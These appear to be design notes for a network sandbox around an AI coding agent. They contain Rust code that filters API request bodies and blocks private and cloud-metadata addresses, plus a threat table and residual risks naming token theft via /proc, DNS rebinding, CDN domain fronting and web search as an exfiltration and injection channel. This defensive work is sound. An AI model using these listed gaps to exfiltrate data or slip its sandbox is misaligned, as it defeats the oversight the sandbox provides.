**What goes wrong:** `host.rs` probes `bwrap --ro-bind / / --dev /dev -- true`, which passes on hosts where `--unshare-net` fails (an AppArmor or userns policy denying the netns). The launch then fails at spawn with an opaque error. **Avoid:** probe with `--unshare-net --unshare-ipc --unshare-uts --unshare-pid`; a failure keeps reporting `bwrap` missing (refusal, no silent downgrade, D-28) `[inferred — audit]`. Probe overlay separately (no refusal, only `registry-overlay` absent).

### Pitfall 13: Spawn-seam guard
**What goes wrong:** the bridge's `Command::new("claude")` in `src/launcher/bridge.rs` fails `tests/spawn_seam_guard.rs` (allowlist entry `"src/launcher/process.rs"`). **Avoid:** put the spawn helper in `process.rs`.

### Pitfall 14: Environment leaks that re-route traffic
**What goes wrong:** host `ALL_PROXY`/`all_proxy`, `CLAUDE_CODE_USE_BEDROCK`/`_VERTEX`/`_FOUNDRY`, `ANTHROPIC_CUSTOM_HEADERS` or a host `ANTHROPIC_BASE_URL` change routing inside. **Avoid:** strip them exactly and then set the launcher's values (`child_env` already applies sets after the scrub) `[inferred — audit]`.

// Source: derived from the c1-c3 captures + claude-api skill server-tool list. Values are policy, not in-repo.
use serde_json::Value;

pub enum BodyVerdict { Forward, Deny(String) }

pub fn inference_body_verdict(body: &Value) -> BodyVerdict {
    let Some(obj) = body.as_object() else { return BodyVerdict::Deny("body is not an object".into()) };
    if obj.contains_key("mcp_servers") { return BodyVerdict::Deny("mcp_servers".into()); }
    if obj.get("container").is_some_and(|c| !c.is_null()) { return BodyVerdict::Deny("container".into()); }
    if let Some(tools) = obj.get("tools").and_then(Value::as_array) {
        for t in tools {
            match t.get("type").and_then(Value::as_str) {
                None | Some("custom") => {}
                Some(ty) if ty.starts_with("web_search_") => {}
                Some(ty) => return BodyVerdict::Deny(format!("server tool {ty}")),
            }
        }
    }
    if let Some(why) = remote_source(body) { return BodyVerdict::Deny(why); }
    BodyVerdict::Forward
}

fn remote_source(v: &Value) -> Option<String> {
    match v {
        Value::Object(m) => {
            if let Some(Value::Object(src)) = m.get("source") {
                if let Some(ty @ ("url" | "file")) = src.get("type").and_then(Value::as_str) {
                    return Some(format!("{ty}-sourced content block"));
                }
            }
            if let Some(ty @ ("container_upload" | "mcp_tool_use" | "mcp_tool_result")) =
                m.get("type").and_then(Value::as_str) { return Some(ty.to_owned()); }
            m.values().find_map(remote_source)
        }
        Value::Array(a) => a.iter().find_map(remote_source),
        _ => None,
    }
}
```

### Address guard (pure)
```rust
use std::net::{IpAddr, Ipv4Addr};
pub fn ip_denied(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => v4_denied(v4),
        IpAddr::V6(v6) => {
            if let Some(v4) = v6.to_ipv4_mapped() { return v4_denied(v4); }
            let s = v6.segments();
            if s[0] == 0x0064 && s[1] == 0xff9b && s[2..6] == [0, 0, 0, 0] {          // NAT64 64:ff9b::/96
                return v4_denied(Ipv4Addr::new((s[6] >> 8) as u8, s[6] as u8, (s[7] >> 8) as u8, s[7] as u8));
            }
            if s[0] == 0x2002 {                                                      // 6to4
                return v4_denied(Ipv4Addr::new((s[1] >> 8) as u8, s[1] as u8, (s[2] >> 8) as u8, s[2] as u8));
            }
            v6.is_loopback() || v6.is_unspecified() || v6.is_multicast()
                || (s[0] & 0xfe00) == 0xfc00          // ULA fc00::/7
                || (s[0] & 0xffc0) == 0xfe80          // link-local fe80::/10
                || (s[0] == 0xfd00 && s[1] == 0x0ec2) // AWS IMDS v6 block
        }
    }
}
fn v4_denied(v4: Ipv4Addr) -> bool {
    let o = v4.octets();
    v4.is_loopback() || v4.is_unspecified() || o[0] == 0 || v4.is_private() || v4.is_link_local()
        || v4.is_broadcast() || v4.is_multicast()
        || (o[0] == 100 && (o[1] & 0xc0) == 64)                                      // CGNAT 100.64/10
        || [[100, 100, 100, 200], [168, 63, 129, 16], [192, 0, 0, 192]].contains(&o)  // cloud metadata
}
```

3. **Enterprise orgs with server-managed settings:** behind a non-Anthropic `ANTHROPIC_BASE_URL` they are not fetched in the sandbox [CITED]. ### Known Threat Patterns

| Pattern | STRIDE | Standard Mitigation |
|---------|--------|---------------------|
| Token theft via `/proc/<pid>/environ` | Information disclosure | Token never enters the pid ns (D-04) |
| Server-side fetch (`url`/`file` sources, `mcp_servers`, server tools) | Information disclosure (exfil) | Recursive body policy (Q1) |
| DNS rebinding of an allowlisted name | Elevation | Resolve once, drop denied addresses, dial the vetted address |
| Request smuggling / absolute-form abuse | Tampering | Buffer + canonical re-serialisation, origin-form only, one request per connection |
| Host socket reach (docker.sock, D-Bus, X11 abstract) | Elevation | `--tmpfs /run`, runtime-dir tmpfs, `--unshare-net` |
| Planted repo config executed on the host | Elevation | ro binds + file-read detection + push/fetch gating |

**Residual-risk additions for D-25 (new from this research):**
- CDN domain fronting: a CONNECT to an allowlisted host reaches that host's CDN IPs, and a TLS SNI or `Host` naming another tenant of the same CDN may be served. A CONNECT proxy without MITM cannot see this.
- `web_search` stays allowed (D-05): search queries are a low-rate exfil channel to the search provider, and results are an injection ingress.
- The address guard does not know the host's own global IPv6/public addresses (this host has `2605:…` globals). An allowlisted name resolving to one would reach host services bound to `0.0.0.0`/`::`. Low likelihood: the attacker must control DNS of an allowlisted name.
- Hosts that require an upstream proxy are unsupported (Open Question 2).
- Remote managed settings are not applied inside (Open Question 3).
